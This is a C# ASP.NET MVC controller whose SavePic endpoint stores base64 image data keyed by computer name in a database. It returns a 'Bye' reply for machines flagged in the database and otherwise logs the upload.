using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Web;
using System.Web.Mvc;
using ThisIsIt.Models;
using static ThisIsIt.Core.Common;

namespace ThisIsIt.Controllers
{
    public class PicHolderController : Controller
    {
        public ActionResult SearchPic()
        {
            using (var db = new ThisIsItEntities())
            {
            }

            return View();
        }

        public string SavePic(string computerName, string base64Data)
        {
            try
            {
                using (var db = new ThisIsItEntities())
                {
                    var flag = $"[Bye][{computerName}]";
                    var saveMe = (from a in db.DataList
                        where a.Flag == flag
                        select a);
                    if (saveMe.Any())
                    {
                        return $"Bye,{computerName}";
                    }
                    else
                    {
                        LogToSql(base64Data, $"[Pic][{computerName}]");
                        return "Success";
                    }
                }
            }
            catch (Exception ex)
            {
                return ex.Message;
            }
        }
    }
}